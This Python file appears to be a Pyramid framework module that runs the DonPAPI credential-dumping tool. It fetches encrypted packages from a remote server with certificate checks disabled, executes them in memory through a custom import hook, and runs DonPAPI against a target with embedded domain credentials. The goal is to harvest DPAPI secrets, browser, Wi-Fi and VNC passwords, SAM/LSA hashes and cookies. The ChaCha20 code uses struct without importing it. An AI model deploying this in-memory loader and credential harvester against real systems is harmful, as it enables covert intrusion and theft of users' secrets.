'''
Author: @snovvcrash (c) 2022

Update 04-2023: @naksyn - bumped to work with Pyramid v.0.1

Description: Pyramid module for executing DonPAPI

Instructions: See README on https://github.com/naksyn/Pyramid

Credits:
  - https://github.com/login-securite/DonPAPI
  - @naksyn (Pyramid Project)

Copyright 2023
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, 
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

This script also contains an adaptation of https://github.com/login-securite/DonPAPI/blob/main/DonPAPI.py
'''

import os
import base64
import ssl
import importlib
import zipfile
import urllib.request
import sys
import io
import time
import logging
import ctypes
import inspect


### This config is generated by Pyramid server upon startup and based on command line given
### AUTO-GENERATED PYRAMID CONFIG ### DELIMITER

pyramid_server='192.168.1.2'
pyramid_port='80'
pyramid_user='test'
pyramid_pass='pass'
encryption='chacha20'
encryptionpass='chacha20'
chacha20IV=b'12345678'
pyramid_http='http'
encode_encrypt_url='/login/'

### END DELIMITER

###### CHANGE THIS BLOCK ##########

### GENERAL CONFIG ####

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

### Directory to which extract pyds dependencies (crypto, paramiko etc.) - can also be a Network Share e.g. \\\\share\\folder
### setting to False extract to current directory
extraction_dir=False

### DonPAPI CONFIG

donpapi_domain = 'test.local'
donpapi_username = 'ADuser'
donpapi_password = 'Password1!'
donpapi_target_host = '192.168.1.2'

#### DO NOT CHANGE BELOW THIS LINE #####


### ChaCha encryption

def yield_chacha20_xor_stream(key, iv, position=0):
  """Generate the xor stream with the ChaCha20 cipher."""
  if not isinstance(position, int):
    raise TypeError
  if position & ~0xffffffff:
    raise ValueError('Position is not uint32.')
  if not isinstance(key, bytes):
    raise TypeError
  if not isinstance(iv, bytes):
    raise TypeError
  if len(key) != 32:
    raise ValueError
  if len(iv) != 8:
    raise ValueError

  def rotate(v, c):
    return ((v << c) & 0xffffffff) | v >> (32 - c)

  def quarter_round(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 7)

  ctx = [0] * 16
  ctx[:4] = (1634760805, 857760878, 2036477234, 1797285236)
  ctx[4 : 12] = struct.unpack('<8L', key)
  ctx[12] = ctx[13] = position
  ctx[14 : 16] = struct.unpack('<LL', iv)
  while 1:
    x = list(ctx)
    for i in range(3):
      quarter_round(x, 0, 4,  8, 12)
      quarter_round(x, 1, 5,  9, 13)
      quarter_round(x, 2, 6, 10, 14)
      quarter_round(x, 3, 7, 11, 15)
      quarter_round(x, 0, 5, 10, 15)
      quarter_round(x, 1, 6, 11, 12)
      quarter_round(x, 2, 7,  8, 13)
      quarter_round(x, 3, 4,  9, 14)
    for c in struct.pack('<16L', *(
        (x[i] + ctx[i]) & 0xffffffff for i in range(16))):
      yield c
    ctx[12] = (ctx[12] + 1) & 0xffffffff
    if ctx[12] == 0:
      ctx[13] = (ctx[13] + 1) & 0xffffffff


def encrypt_chacha20(data, key, iv=None, position=0):
  """Encrypt (or decrypt) with the ChaCha20 cipher."""
  if not isinstance(data, bytes):
    raise TypeError
  if iv is None:
    iv = b'\0' * 8
  if isinstance(key, bytes):
    if not key:
      raise ValueError('Key is empty.')
    if len(key) < 32:
      # TODO(pts): Do key derivation with PBKDF2 or something similar.
      key = (key * (32 // len(key) + 1))[:32]
    if len(key) > 32:
      raise ValueError('Key too long.')

  return bytes(a ^ b for a, b in
      zip(data, yield_chacha20_xor_stream(key, iv, position)))

### XOR encryption

def encrypt(data, key):
    xored_data = []
    i = 0
    for data_byte in data:
        if i < len(key):
            xored_byte = data_byte ^ key[i]
            xored_data.append(xored_byte)
            i += 1
        else:
            xored_byte = data_byte ^ key[0]
            xored_data.append(xored_byte)
            i = 1
    return bytes(xored_data)


### Encryption wrapper ####

def encrypt_wrapper(data, encryption):
    if encryption == 'xor':
        result=encrypt(data, encryptionpass.encode())
        return result
    elif encryption == 'chacha20':
        result=encrypt_chacha20(data, encryptionpass.encode(),chacha20IV)
        return result		



cwd=os.getcwd()

if not extraction_dir:
	extraction_dir=cwd
	
sys.path.insert(1,extraction_dir)

zip_name='donpapi---Cryptodome'
print("[*] Downloading and unpacking on disk Cryptodome pyds dependencies on dir {}".format(extraction_dir))
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
gcontext.check_hostname = False
gcontext.verify_mode = ssl.CERT_NONE
request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
          base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
          headers={'User-Agent': user_agent})
base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
with urllib.request.urlopen(request, context=gcontext) as response:
   zip_web = response.read()

print("[*] Decrypting received file")   
zip_web= encrypt_wrapper(zip_web, encryption)

with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
    zip_ref.extractall(extraction_dir)
   

#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]


class ZipImportError(ImportError):
	"""Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package


class CFinder(object):
	"""Import Hook"""
	def __init__(self, repoName):
		self.repoName = repoName
		self._source_cache = {}

	def _get_info(self, fullname):
		"""Search for the respective package or module in the zipfile object"""
		parts = fullname.split('.')
		submodule = parts[-1]
		modulepath = '/'.join(parts)

		#check to see if that specific module exists

		for suffix, is_package in _search_order:
			relpath = modulepath + suffix
			try:
				moduleRepo[self.repoName].getinfo(relpath)
			except KeyError:
				pass
			else:
				return submodule, is_package, relpath

		#Error out if we can find the module/package
		msg = ('Unable to locate module %s in the %s repo' % (submodule, self.repoName))
		raise ZipImportError(msg)

	def _get_source(self, fullname):
		"""Get the source code for the requested module"""
		submodule, is_package, relpath = self._get_info(fullname)
		fullpath = '%s/%s' % (self.repoName, relpath)
		if relpath in self._source_cache:
			source = self._source_cache[relpath]
			return submodule, is_package, fullpath, source
		try:
			### added .decode
			source =  moduleRepo[self.repoName].read(relpath).decode()
			#print(source)
			source = source.replace('\r\n', '\n')
			source = source.replace('\r', '\n')
			self._source_cache[relpath] = source
			return submodule, is_package, fullpath, source
		except:
			raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

	def find_spec(self, fullname, path=None, target=None):
		try:
			submodule, is_package, relpath = self._get_info(fullname)
		except ImportError:
			return None
		else:
			return importlib.util.spec_from_loader(fullname, self)

	def create_module(self, spec):
		return None

	def exec_module(self, module):
		submodule, is_package, fullpath, source = self._get_source(module.__name__)
		code = compile(source, fullpath, 'exec')
		if is_package:
			module.__path__ = [os.path.dirname(fullpath)]
		exec(code, module.__dict__)

	def get_data(self, fullpath):

		prefix = os.path.join(self.repoName, '')
		if not fullpath.startswith(prefix):
			raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
		relpath = fullpath[len(prefix):]
		try:
			return moduleRepo[self.repoName].read(relpath)
		except KeyError:
			raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

	def is_package(self, fullname):
		"""Return if the module is a package"""
		submodule, is_package, relpath = self._get_info(fullname)
		return is_package

	def get_code(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(fullname)
		return compile(source, fullpath, 'exec')

def install_hook(repoName):
	if repoName not in _meta_cache:
		finder = CFinder(repoName)
		_meta_cache[repoName] = finder
		sys.meta_path.append(finder)

def remove_hook(repoName):
	if repoName in _meta_cache:
		finder = _meta_cache.pop(repoName)
		sys.meta_path.remove(finder)

def hook_routine(fileName,zip_web):
	#print(zip_web)
	zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
	#print(zf)
	moduleRepo[fileName]=zf
	install_hook(fileName)

### separator --- is used by Pyramid server to look into the specified dependency folder

zip_list = [
	'donpapi---setuptools',
	'donpapi---pkg_resources',
	'donpapi---future',
	'donpapi---pyasn1',
	'donpapi---LnkParse3',
	'donpapi---impacket',
	'donpapi---six',
	'donpapi---ldap3',
	'donpapi---DonPAPI'
]

for zip_name in zip_list:
    try:
        print("[*] Loading in memory module package: " + (zip_name.split('---')[-1] if '---' in zip_name else zip_name) )
        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
                  base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
				  headers={'User-Agent': user_agent})
				  
        base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
        request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
        with urllib.request.urlopen(request, context=gcontext) as response:
            zip_web = response.read()
            print("[*] Decrypting received file") 
            zip_web= encrypt_wrapper(zip_web,encryption)
            hook_routine(zip_name, zip_web)

    except Exception as e:
        print(e)

print("[*] Modules imported")


#!/usr/bin/env python
# coding:utf-8
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description: Dump DPAPI secrets remotely
#
# Author:
#  PA Vandewoestyne
#  Credits :
#  Alberto Solino (@agsolino)
#  Benjamin Delpy (@gentilkiwi) for most of the DPAPI research (always greatly commented - <3 your code)
#  Alesandro Z (@) & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur.
#  dirkjanm @dirkjanm for the base code of adconnect dump (https://github.com/fox-it/adconnectdump) & every research he ever did. i learned so much on so many subjects thanks to you. <3
#  @Byt3bl3d33r for CME (lots of inspiration and code comes from CME : https://github.com/byt3bl33d3r/CrackMapExec )
#  All the Team of @LoginSecurite for their help in debugging my shity code (special thanks to @layno & @HackAndDo for that)

#
#from __future__ import division
#from __future__ import print_function
import sys
import logging
import argparse,os,re,json,sqlite3
#from impacket import version
from myseatbelt import MySeatBelt
import concurrent.futures
from lib.toolbox import split_targets,bcolors
from database import database, reporting
from datetime import date


global assets
assets={}


def main():
	global assets
	# Init the example's logger theme
	#logger.init()
	#print(version.BANNER)
	parser = argparse.ArgumentParser(add_help = True, description = "SeatBelt implementation.")

	parser.add_argument('target', nargs='?', action='store', help='[[domain/]username[:password]@]<targetName or address>',default='')
	parser.add_argument('-credz', action='store', help='File containing multiple user:password or user:hash for masterkeys decryption')
	parser.add_argument('-pvk', action='store', help='input backupkey pvk file')
	parser.add_argument('-d','--debug', action='store_true', help='Turn DEBUG output ON')
	parser.add_argument('-t',  default='30', metavar="number of threads",  help='number of threads')
	parser.add_argument('-o', '--output_directory', default='./', help='output log directory')

	group = parser.add_argument_group('authentication')
	group.add_argument('-H','--hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
	group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
	group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
													   '(KRB5CCNAME) based on target parameters. If valid credentials '
													   'cannot be found, it will use the ones specified in the command line')
	group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (1128 or 256 bits)')
	group.add_argument('-local_auth', action="store_true",   help='use local authentification', default=False)
	group.add_argument('-laps', action="store_true", help='use LAPS to request local admin password', default=False)


	group = parser.add_argument_group('connection')
	group.add_argument('-dc-ip', action='store', metavar="ip address",  help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
	group.add_argument('-target-ip', action='store', metavar="ip address",   help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
							'This is useful when target is the NetBIOS name and you cannot resolve it')
	group.add_argument('-port', choices=['135', '139', '445'], nargs='?', default='445', metavar="destination port", help='Destination port to connect to SMB Server')

	group = parser.add_argument_group('Reporting')
	group.add_argument('-R', '--report', action="store_true", help='Only Generate Report on the scope', default=False)
	group.add_argument('--type', action="store", help='only report "type" password (wifi,credential-blob,browser-internet_explorer,LSA,SAM,taskscheduler,VNC,browser-chrome,browser-firefox')
	group.add_argument('-u','--user', action="store_true", help='only this username')
	group.add_argument('--target', action="store_true", help='only this target (url/IP...)')

	group = parser.add_argument_group('attacks')
	group.add_argument('--no_browser', action="store_true", help='do not hunt for browser passwords', default=False)
	group.add_argument('--no_dpapi', action="store_true", help='do not hunt for DPAPI secrets', default=False)
	group.add_argument('--no_vnc', action="store_true", help='do not hunt for VNC passwords', default=False)
	group.add_argument('--no_remoteops', action="store_true", help='do not hunt for SAM and LSA with remoteops', default=False)
	group.add_argument('--GetHashes', action="store_true", help="Get all users Masterkey's hash & DCC2 hash", default=False)
	group.add_argument('--no_recent', action="store_true", help="Do not hunt for recent files", default=False)
	group.add_argument('--no_sysadmins', action="store_true", help="Do not hunt for sysadmins stuff (mRemoteNG, vnc, keepass, lastpass ...)", default=False)
	group.add_argument('--from_file', action='store', help='Give me the export of ADSyncQuery.exe ADSync.mdf to decrypt ADConnect password', default='adsync_export')

	#if len(sys.argv)==1:
		#parser.print_help()
		#sys.exit(1)

	target_string= donpapi_domain + '/' + donpapi_username + ':' + donpapi_password + '@' + donpapi_target_host
	options = parser.parse_args([target_string])
	#logging.basicConfig(filename='debug.log', level=logging.DEBUG)

	if options.debug is True:
		logging.basicConfig(format='%(asctime)s.%(msecs)03d %(levelname)s {%(module)s} [%(funcName)s] %(message)s',
		                    datefmt='%Y-%m-%d,%H:%M:%S', level=logging.DEBUG,
		                    handlers=[logging.FileHandler("debug.log"), logging.StreamHandler()])
		logging.getLogger().setLevel(logging.DEBUG)
	else:
		logging.basicConfig(format='%(levelname)s %(message)s',
		                    datefmt='%Y-%m-%d,%H:%M:%S', level=logging.DEBUG,
		                    handlers=[logging.FileHandler("debug.log"), logging.StreamHandler()])
		logging.getLogger().setLevel(logging.INFO)

	options.domain, options.username, options.password, options.address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

	#Load Configuration and add them to the options
	load_configs(options)
	#init database?
	first_run(options)
	#

	if options.report is not None and options.report!=False:
		options.report = True
	#In case the password contains '@'
	if '@' in options.address:
		options.password = options.password + '@' + options.address.rpartition('@')[0]
		options.address = options.address.rpartition('@')[2]

	options.username=options.username.lower() #for easier compare

	if options.target_ip is None:
		options.target_ip = options.address
	if options.domain is None:
		options.domain = ''

	if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
		from getpass import getpass
		options.password = getpass("Password:")

	if options.aesKey is not None:
		options.k = True
	if options.hashes is not None:
		if ':' in options.hashes:
			options.lmhash, options.nthash = options.hashes.split(':')
		else:
			options.lmhash = 'aad3b435b51404eeaad3b435b51404ee'
			options.nthash = options.hashes
	else:
		options.lmhash = ''
		options.nthash = ''
	credz={}
	if options.credz is not None:
		if os.path.isfile(options.credz):
			with open(options.credz, 'rb') as f:
				file_data = f.read().replace(b'\x0d', b'').split(b'\n')
				for cred in file_data:
					if b':' in cred:
						tmp_split = cred.split(b':')
						tmp_username = tmp_split[0].lower() #Make all usernames lower for easier compare
						tmp_password = b''.join(tmp_split[1:])
						#Add "history password to account pass to test
						if b'_history' in tmp_username:
							tmp_username=tmp_username[:tmp_username.index(b'_history')]
						if tmp_username.decode('utf-8') not in credz:
							credz[tmp_username.decode('utf-8')] = [tmp_password.decode('utf-8')]
						else:
							credz[tmp_username.decode('utf-8')].append(tmp_password.decode('utf-8'))
			logging.info(f'Loaded {len(credz)} user credentials')

		else:
			logging.error(f"[!]Credential file {options.credz} not found")
	#Also adding submited credz
	if options.username not in credz:
		if options.password!='':
			credz[options.username] = [options.password]
		if options.nthash!='':
			credz[options.username] = [options.nthash]
	else:
		if options.password!='':
			credz[options.username].append(options.password)
		if options.nthash!='':
			credz[options.username].append(options.nthash)
	options.credz=credz

	targets = split_targets(options.target_ip)
	logging.info("Loaded {i} targets".format(i=len(targets)))
	if len(targets) > 0 :
		try:
			with concurrent.futures.ThreadPoolExecutor(max_workers=int(options.t)) as executor:
				executor.map(seatbelt_thread, [(target, options, logging) for target in targets])
		except Exception as e:
			if logging.getLogger().level == logging.DEBUG:
				import traceback
				traceback.print_exc()
			logging.error(str(e))
		#print("ENDING MAIN")


	if options.report :
		try:
			my_report = reporting(sqlite3.connect(options.db_path), logging,options,targets)
			# Splited reports
			my_report.generate_report(report_file='%s_Client_view.html' % date.today().strftime("%d-%m-%Y"),
			                          report_content=['credz', 'hash_reuse'], credz_content=['taskscheduler', 'LSA'])
			my_report.generate_report(report_file='%s_Most_important_credz.html' % date.today().strftime("%d-%m-%Y"),
			                          report_content=['credz'],
			                          credz_content=['wifi', 'taskscheduler', 'credential-blob', 'browser', 'sysadmin',
			                                         'LSA'])
			my_report.generate_report(report_file='%s_cookies.html' % date.today().strftime("%d-%m-%Y"),
			                          report_content=['cookies'], credz_content=[''])
			# Main report
			my_report.generate_report(report_file='%s_Full_Report.html' % date.today().strftime("%d-%m-%Y"))
			logging.info("[+] Exporting loots to raw files : credz, sam, cookies")
			my_report.export_credz()
			my_report.export_sam()
			my_report.export_cookies()
			if options.GetHashes:
				my_report.export_MKF_hashes()
				my_report.export_dcc2_hashes()
		except Exception as e:
			logging.error(str(e))


def load_configs(options):
	#seatbelt_path = os.path.dirname(os.path.realpath(__file__))
	#config_file=os.path.join(os.path.join(seatbelt_path,"config"),"seatbelt_config.json")
	#with open(config_file,'rb') as config:
	#config_parser = json.load(config)
	options.db_path = 'seatbelt.db'
	options.db_name = 'seatbelt.db'
	options.workspace = 'default'


def first_run(options):
	#Create directory if needed
	if not os.path.exists(options.output_directory) :
		os.mkdir(options.output_directory)
	db_path=os.path.join(options.output_directory,options.db_name)
	logging.debug(f"Database file = {db_path}")
	options.db_path = db_path
	if not os.path.exists(options.db_path):
		logging.info(f'Initializing database {options.db_path}')
		conn = sqlite3.connect(options.db_path,check_same_thread=False)
		c = conn.cursor()
		# try to prevent some of the weird sqlite I/O errors
		c.execute('PRAGMA journal_mode = OFF')
		c.execute('PRAGMA foreign_keys = 1')
		database(conn, logging).db_schema(c)
		#getattr(protocol_object, 'database').db_schema(c)
		# commit the changes and close everything off
		conn.commit()
		conn.close()


def seatbelt_thread(datas):
	global assets
	target,options, logger=datas
	logging.debug("[*] SeatBelt thread for {ip} Started".format(ip=target))

	try:
		mysb = MySeatBelt(target,options,logger)
		if mysb.admin_privs:
			mysb.do_test()
			# mysb.run()
			#mysb.quit()
		else:
			logging.debug("[*] No ADMIN account on target {ip}".format(ip=target))

		#assets[target] = mysb.get_secrets()
		logging.debug("[*] SeatBelt thread for {ip} Ended".format(ip=target))
	except Exception as e:
		if logging.getLogger().level == logging.DEBUG:
			import traceback
			traceback.print_exc()
		logging.error(str(e))


if __name__ == "__main__":
	main()

